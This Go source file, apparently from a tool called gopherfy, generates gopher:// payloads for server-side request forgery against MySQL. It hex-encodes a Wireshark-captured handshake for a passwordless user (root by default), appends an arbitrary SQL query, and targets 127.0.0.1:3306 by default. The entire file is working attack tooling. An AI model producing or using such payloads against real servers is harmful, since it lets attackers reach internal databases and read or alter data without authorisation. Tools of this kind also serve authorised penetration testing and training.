package mysql

import (
	"encoding/hex"
	"fmt"
	"strings"

	"github.com/hupe1980/gopherfy/internal"
)

const (
	DefaultAddr = "127.0.0.1:3306"
	DefaultUser = "root"
)

type Options struct {
	Addr  string
	User  string
	Query string
}

type MySQL struct {
	addr  string
	user  string
	query string
}

func NewMySQL(optFns ...func(o *Options)) *MySQL {
	options := Options{
		Addr: DefaultAddr,
		User: DefaultUser,
	}

	for _, fn := range optFns {
		fn(&options)
	}

	return &MySQL{
		addr:  strings.TrimSpace(options.Addr),
		user:  strings.TrimSpace(options.User),
		query: strings.TrimSpace(options.Query),
	}
}

func (my *MySQL) Payload() string {
	payload := my.generateAuth()

	if my.query != "" {
		payload = payload + my.generateQuery()
	}

	payload = internal.InsertNth(payload, '%', 2)

	return fmt.Sprintf("gopher://%s/_%%%s", my.addr, payload)
}

func (my *MySQL) generateAuth() string {
	// Captured with wireshark
	auth := "%x00000185a6ff0100000001210000000000000000000000000000000000000000000000%x00006d7973716c5f6e61746976655f70617373776f72640066035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f7069640532373235350f5f636c69656e745f76657273696f6e06352e372e3232095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c"

	return fmt.Sprintf(auth, rune(0xa3+len(my.user)-4), my.user)
}

func (my *MySQL) generateQuery() string {
	query := fmt.Sprintf("%x", my.query)
	decoded, _ := hex.DecodeString(fmt.Sprintf("%06x", (len(query)/2)+1))

	internal.ReverseSlice(decoded)

	return fmt.Sprintf("%x0003%s0100000001", decoded, query)
}
